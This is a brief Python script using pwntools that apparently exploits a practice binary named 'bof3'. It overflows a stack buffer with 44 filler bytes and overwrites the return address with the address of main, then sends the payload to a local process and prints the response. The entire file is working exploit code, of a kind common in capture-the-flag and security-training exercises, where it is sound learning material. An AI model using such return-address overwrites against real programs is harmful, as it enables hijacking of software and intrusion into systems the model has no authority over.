#!/usr/bin/python3

from pwn import *

#context.arch = 'i386'
#context.bits = '32'
#context.endian = 'little'

buffer = 0x804c060 
offset = 44
elf = ELF('./bof3')
mainaddr = elf.symbols['main']
#mainaddr = 0x080491e6 


payload = b'A' * 44 
payload += p32(mainaddr) 


p = process('./bof3')
p.sendline(payload)
print(p.recv())

